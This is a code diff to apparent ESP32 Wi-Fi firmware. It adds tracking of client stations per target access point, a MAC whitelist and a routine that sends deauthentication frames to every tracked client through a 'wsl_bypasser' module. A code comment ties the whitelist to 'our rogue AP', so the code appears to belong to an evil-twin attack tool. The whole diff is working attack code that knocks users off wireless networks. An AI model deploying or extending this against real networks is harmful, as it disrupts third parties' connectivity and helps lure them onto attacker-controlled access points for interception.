@@ -10,6 +10,25 @@
 #include "esp_wifi_types.h"
 #include "esp_netif.h"
 #include "esp_event.h"
+#include "wsl_bypasser.h"
+#include "freertos/semphr.h"
+
+#define MAX_TRACKED_APS 6
+#define MAX_CLIENTS_PER_AP 32
+
+
+typedef struct {
+    uint8_t ap_bssid[6];
+    uint8_t clients[MAX_CLIENTS_PER_AP][6];
+    int client_count;
+} tracked_ap_clients_t;
+
+static tracked_ap_clients_t tracked_aps[MAX_TRACKED_APS];
+static uint8_t current_target_bssid[6] = {0};
+static bool target_set = false;
+static SemaphoreHandle_t clients_lock = NULL;
+static uint8_t whitelisted_macs[8][6];
+static int whitelist_count = 0;
 
 static const char* TAG = "wifi_controller";
 static bool wifi_init = false;
@@ -165,4 +184,229 @@ void wifictl_set_channel(uint8_t channel){
         return;
     }
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+
+static void ensure_clients_lock() {
+    if (clients_lock == NULL) {
+        clients_lock = xSemaphoreCreateMutex();
+    }
+}
+
+
+bool wifictl_is_target_set(void) {
+    ensure_clients_lock();
+    bool set;
+    if (xSemaphoreTake(clients_lock, portMAX_DELAY) == pdTRUE) {
+        set = target_set;
+        xSemaphoreGive(clients_lock);
+    } else {
+        set = false;
+    }
+    return set;
+}
+
+void wifictl_get_target_bssid(uint8_t *out_bssid) {
+    if (out_bssid == NULL) return;
+    ensure_clients_lock();
+    if (xSemaphoreTake(clients_lock, portMAX_DELAY) == pdTRUE) {
+        memcpy(out_bssid, current_target_bssid, 6);
+        xSemaphoreGive(clients_lock);
+    } else {
+        memset(out_bssid, 0, 6);
+    }
+}
+
+void wifictl_stop_sniffer_and_clear_target(void) {
+    ESP_LOGI(TAG, "Stopping sniffer and clearing tracked clients/target");
+    // stop promiscuous mode
+    esp_wifi_set_promiscuous(false);
+
+    // clear tracked clients for current target
+    ensure_clients_lock();
+    if (xSemaphoreTake(clients_lock, portMAX_DELAY) == pdTRUE) {
+        // clear tracked entry that matches current_target_bssid
+        for (int i = 0; i < MAX_TRACKED_APS; i++) {
+            if (memcmp(tracked_aps[i].ap_bssid, current_target_bssid, 6) == 0) {
+                memset(&tracked_aps[i], 0, sizeof(tracked_ap_clients_t));
+                break;
+            }
+        }
+        // clear the current target and mark unset
+        memset(current_target_bssid, 0, sizeof(current_target_bssid));
+        target_set = false;
+        xSemaphoreGive(clients_lock);
+    }
+}
+
+
+void wifictl_set_target_bssid(const uint8_t *bssid) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    memcpy(current_target_bssid, bssid, 6);
+    target_set = true;
+    // ensure tracker entry exists for this bssid
+    for (int i=0;i<MAX_TRACKED_APS;i++){
+        if (memcmp(tracked_aps[i].ap_bssid, bssid, 6) == 0) {
+            // already present
+            xSemaphoreGive(clients_lock);
+            return;
+        }
+    }
+    // find empty slot
+    for (int i=0;i<MAX_TRACKED_APS;i++){
+        bool empty = true;
+        for (int j=0;j<6;j++) if (tracked_aps[i].ap_bssid[j] != 0) { empty = false; break; }
+        if (empty) {
+            memcpy(tracked_aps[i].ap_bssid, bssid, 6);
+            tracked_aps[i].client_count = 0;
+            break;
+        }
+    }
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_clear_target_bssid(void) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    memset(current_target_bssid, 0, sizeof(current_target_bssid));
+    target_set = false;
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_clear_tracked_clients_for_bssid(const uint8_t *bssid) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    for (int i=0;i<MAX_TRACKED_APS;i++){
+        if (memcmp(tracked_aps[i].ap_bssid, bssid, 6)==0) {
+            memset(&tracked_aps[i], 0, sizeof(tracked_ap_clients_t));
+            break;
+        }
+    }
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_clear_all_tracked_clients(void) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    memset(tracked_aps, 0, sizeof(tracked_aps));
+    xSemaphoreGive(clients_lock);
+}
+
+static bool is_whitelisted(const uint8_t *mac) {
+    for (int i=0;i<whitelist_count;i++){
+        if (memcmp(whitelisted_macs[i], mac, 6)==0) return true;
+    }
+    return false;
+}
+
+void wifictl_whitelist_mac(const uint8_t *mac) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    if (whitelist_count < (int)(sizeof(whitelisted_macs)/6)) {
+        memcpy(whitelisted_macs[whitelist_count++], mac, 6);
+    }
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_remove_whitelist_mac(const uint8_t *mac) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    for (int i = 0; i < whitelist_count; ++i) {
+        if (memcmp(whitelisted_macs[i], mac, 6) == 0) {
+            // move last into this slot (or zero out)
+            if (i != whitelist_count - 1) {
+                memcpy(whitelisted_macs[i], whitelisted_macs[whitelist_count - 1], 6);
+            }
+            memset(whitelisted_macs[whitelist_count - 1], 0, 6);
+            --whitelist_count;
+            ESP_LOGI(TAG, "Removed MAC from whitelist %02X:%02X:%02X:%02X:%02X:%02X",
+                     mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+            break;
+        }
+    }
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_track_client(const uint8_t *ap_bssid, const uint8_t *sta_mac) {
+    if (is_whitelisted(sta_mac)) return;
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    // find ap entry
+    int slot = -1;
+    for (int i=0;i<MAX_TRACKED_APS;i++){
+        if (memcmp(tracked_aps[i].ap_bssid, ap_bssid, 6)==0) { slot = i; break; }
+    }
+    if (slot == -1) {
+        // try to create slot
+        for (int i=0;i<MAX_TRACKED_APS;i++){
+            bool empty = true;
+            for (int j=0;j<6;j++) if (tracked_aps[i].ap_bssid[j] != 0) { empty = false; break; }
+            if (empty) {
+                slot = i;
+                memcpy(tracked_aps[i].ap_bssid, ap_bssid, 6);
+                tracked_aps[i].client_count = 0;
+                break;
+            }
+        }
+    }
+    if (slot == -1) {
+        // no space
+        xSemaphoreGive(clients_lock);
+        return;
+    }
+    // check duplicate
+    for (int c=0;c<tracked_aps[slot].client_count;c++){
+        if (memcmp(tracked_aps[slot].clients[c], sta_mac, 6)==0) {
+            xSemaphoreGive(clients_lock);
+            return;
+        }
+    }
+    if (tracked_aps[slot].client_count < MAX_CLIENTS_PER_AP) {
+        memcpy(tracked_aps[slot].clients[tracked_aps[slot].client_count++], sta_mac, 6);
+        ESP_LOGI("wifictl", "Tracked client %02X:%02X:%02X:%02X:%02X:%02X for BSSID %02X:%02X:%02X:%02X:%02X:%02X",
+                 sta_mac[0],sta_mac[1],sta_mac[2],sta_mac[3],sta_mac[4],sta_mac[5],
+                 ap_bssid[0],ap_bssid[1],ap_bssid[2],ap_bssid[3],ap_bssid[4],ap_bssid[5]);
+    }
+    xSemaphoreGive(clients_lock);
+}
+
+void wifictl_untrack_client(const uint8_t *mac) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+
+    for (int i = 0; i < sizeof(tracked_aps) / sizeof(tracked_aps[0]); ++i) {
+        for (int j = 0; j < tracked_aps[i].client_count; ++j) {
+            if (memcmp(tracked_aps[i].clients[j], mac, 6) == 0) {
+                // remove client from list
+                if (j != tracked_aps[i].client_count - 1) {
+                    memcpy(tracked_aps[i].clients[j], tracked_aps[i].clients[tracked_aps[i].client_count - 1], 6);
+                }
+                tracked_aps[i].client_count--;
+                ESP_LOGI(TAG, "Untracked client " MACSTR, MAC2STR(mac));
+                break;
+            }
+        }
+    }
+
+    xSemaphoreGive(clients_lock);
+}
+
+/**
+ * Deauth all tracked clients for given AP bssid.
+ */
+void wifictl_deauth_tracked_clients(const uint8_t *ap_bssid) {
+    ensure_clients_lock();
+    xSemaphoreTake(clients_lock, portMAX_DELAY);
+    for (int i=0;i<MAX_TRACKED_APS;i++){
+        if (memcmp(tracked_aps[i].ap_bssid, ap_bssid, 6)==0) {
+            for (int c=0;c<tracked_aps[i].client_count;c++){
+                // Skip any whitelisted clients (e.g., stations connected to our rogue AP)
+                if (!is_whitelisted(tracked_aps[i].clients[c])) {
+                    wsl_bypasser_send_deauth_to_sta(ap_bssid, tracked_aps[i].clients[c]);
+                }
+            }
+            break;
+        }
+    }
+    xSemaphoreGive(clients_lock);
 }
